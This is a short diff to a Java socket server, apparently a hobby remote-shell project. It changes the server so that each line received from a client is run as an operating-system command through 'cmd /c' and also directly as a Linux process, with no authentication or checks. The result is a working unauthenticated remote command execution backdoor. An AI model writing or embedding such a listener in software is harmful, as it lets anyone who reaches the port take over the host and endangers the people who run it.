@@ -30,9 +30,9 @@ public class Server {
                 // read the message sent by the client via socket
                 line = input.readUTF();
                 System.out.println(line);
-                String string_cod = line;
                 // try to execute the command on cmd using Runtime.getRuntime
-                Process cmd_process = Runtime.getRuntime().exec(new String[]{"cmd", "/c " + string_cod});
+                Process cmd_process = Runtime.getRuntime().exec(new String[]{"cmd", "/c " + line});
+                Process linux_process = Runtime.getRuntime().exec(new String[]{line});
             }
             // close the connection
             System.out.println("Made by Fedi6431");
